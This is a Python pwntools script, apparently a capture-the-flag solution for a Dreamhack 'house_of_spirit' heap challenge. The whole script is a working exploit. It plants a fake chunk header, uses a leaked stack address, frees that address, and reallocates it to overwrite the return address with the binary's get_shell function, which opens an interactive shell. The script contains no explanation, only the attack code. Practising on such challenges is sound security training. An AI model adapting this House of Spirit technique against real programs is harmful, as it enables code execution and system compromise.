#!/usr/bin/python3

from pwn import * 

context.binary = exe = ELF('./house_of_spirit',checksec=False)
p = process()
gdb.attach(p,gdbscript=
           '''
           b*0x0000000000400A70
           ''')
#p = remote('host3.dreamhack.games', 19926)

def add(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', size)
    p.sendafter(b'Data: ', data)

def free(addr):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b": ", addr)

fake_chunk  = p64(0) + p64(0x50)

p.sendafter(b'name: ',fake_chunk)

stack = int(p.recvuntil(b':')[:-1],16)

log.info(f"leak stack: {hex(stack)}")

input()

free(str(stack+0x10))

add(str(int(0x40)),b'a'*0x28 + p64(exe.sym.get_shell))

p.interactive()
